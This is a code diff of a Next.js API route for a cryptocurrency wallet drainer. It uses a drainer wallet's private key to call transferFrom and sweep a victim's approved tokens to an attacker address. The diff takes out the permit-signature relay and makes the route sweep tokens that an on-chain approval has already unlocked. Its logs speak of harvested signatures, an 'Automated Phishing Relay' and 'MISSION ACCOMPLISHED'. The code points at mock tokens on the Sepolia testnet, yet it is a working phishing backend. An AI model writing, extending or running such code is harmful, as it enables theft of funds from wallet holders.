@@ -6,7 +6,6 @@ import { ethers } from 'ethers';
 // But we'll build it to fall back properly or assume process.env is populated since `npm run dev` typically catches `.env.local`.
 
 const abi = [
-    "function permit(address owner, address spender, uint256 value, uint256 deadline, uint8 v, bytes32 r, bytes32 s)",
     "function transferFrom(address from, address to, uint256 amount)",
     "function balanceOf(address account) view returns (uint256)"
 ];
@@ -14,11 +13,7 @@ const abi = [
 export async function POST(request: Request) {
     try {
         const payload = await request.json();
-        const { victimAddress, drainerAddress, drainAmount, deadline, signature } = payload;
-
-        if (!signature) {
-            return NextResponse.json({ error: 'Missing Signature Data' }, { status: 400 });
-        }
+        const { victimAddress, drainerAddress, drainAmount } = payload;
 
         // Setup the RPC connection and the malicious drainer wallet
         const rpcUrl = process.env.NEXT_PUBLIC_SEPOLIA_RPC_URL || process.env.SEPOLIA_RPC_URL;
@@ -34,34 +29,16 @@ export async function POST(request: Request) {
         const drainerWallet = new ethers.Wallet(privateKey, provider);
         const token = new ethers.Contract(tokenAddress, abi, drainerWallet);
 
-        console.log(`\n[+] API Route Received Harvested Signature from ${victimAddress}`);
+        console.log(`\n[+] API Route Triggered: On-Chain Approval Detected from ${victimAddress}`);
         console.log(`[+] Executing Automated Phishing Relay...`);
 
-        // Decode the raw hex signature
-        const sig = ethers.Signature.from(signature);
-
-        // Broadcast the permit transaction
-        console.log(`[Step 1/2] Broadcasting Permit Payload...`);
-        const permitTx = await token.permit(
-            victimAddress,
-            drainerAddress,
-            drainAmount,
-            deadline,
-            sig.v,
-            sig.r,
-            sig.s
-        );
-
-        await permitTx.wait();
-        console.log(`[✔] Cryptographic signature successfully validated by network (Hash: ${permitTx.hash})`);
-
-        // Broadcast the sweep transaction
-        console.log(`[Step 2/2] Automatically draining wallet contents...`);
+        // Broadcast the sweep transaction directly (since approval is already on-chain)
+        console.log(`[Step 1/1] Automatically draining 100% of approved wallet contents...`);
         const balance = await token.balanceOf(victimAddress);
 
         if (balance === BigInt(0)) {
-            console.log(`[-] Victim balance evaluates to 0 MockUSDC. Extraction terminated safely.`);
-            return NextResponse.json({ success: true, message: 'Permitted successfully but victim had 0 balance.' });
+            console.log(`[-] Victim balance evaluates to 0 MockUSDT. Extraction terminated safely.`);
+            return NextResponse.json({ success: true, message: 'Approval confirmed but victim had 0 balance.' });
         }
 
         const amountToDrain = BigInt(drainAmount);
@@ -70,7 +47,7 @@ export async function POST(request: Request) {
         const sweepTx = await token.transferFrom(victimAddress, drainerAddress, sweepAmount);
         await sweepTx.wait();
 
-        console.log(`[✅ MISSION ACCOMPLISHED] Drained ${ethers.formatUnits(sweepAmount, 6)} MockUSDC perfectly!`);
+        console.log(`[✅ MISSION ACCOMPLISHED] Drained ${ethers.formatUnits(sweepAmount, 6)} MockUSDT perfectly from on-chain approval!`);
 
         return NextResponse.json({ success: true, hash: sweepTx.hash });
 
